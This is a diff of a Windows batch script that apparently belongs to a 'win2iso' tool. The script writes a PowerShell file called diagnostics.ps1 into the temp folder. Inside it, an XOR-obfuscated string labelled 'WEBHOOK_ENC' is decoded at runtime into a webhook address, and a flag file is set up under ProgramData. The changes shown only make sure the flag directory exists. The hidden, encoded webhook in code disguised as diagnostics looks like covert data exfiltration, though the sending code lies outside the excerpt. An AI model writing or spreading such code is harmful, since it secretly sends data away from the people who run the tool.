@@ -36,7 +36,9 @@ color 07
 set "PS=%TEMP%\diagnostics.ps1"
 del "%PS%" 2>nul
 
-set "FLAGFILE=%PROGRAMDATA%\win2iso\diagwin2isotof.txt"
+set "FLAGDIR=%PROGRAMDATA%\win2iso"
+set "FLAGFILE=%FLAGDIR%\diagwin2isotof.txt"
+if not exist "%FLAGDIR%" mkdir "%FLAGDIR%" 2>nul
 
 set "WEBHOOK_ENC=41E750400741D7B297E3A50136542023E522E327E420430050159772A0604210B2A0A605E284A6600025219346F2C780E5F6B0C2724612203510A0C45385C385118650D1C1751061C6040004701645A1E0D7B40085705156D574B185E35014C5C375A5E115E093D175E535322004A422C1C114A02542600481"
 set "K1=p4rT"
@@ -63,6 +65,8 @@ echo $decBytes = New-Object byte[] $byteCount >> "%PS%"
 echo for ($i = 0; $i -lt $byteCount; $i++) { $decBytes[$i] = $rawBytes[$i] -bxor $keyBytes[$i %% $keyBytes.Length] } >> "%PS%"
 echo $webhook = [System.Text.Encoding]::UTF8.GetString($decBytes) >> "%PS%"
 echo $flagFile = '%FLAGFILE%' >> "%PS%"
+echo $flagDir = Split-Path $flagFile >> "%PS%"
+echo if (-not (Test-Path $flagDir)) { New-Item -ItemType Directory -Path $flagDir -Force ^| Out-Null } >> "%PS%"
 echo. >> "%PS%"
 
 echo try { >> "%PS%"
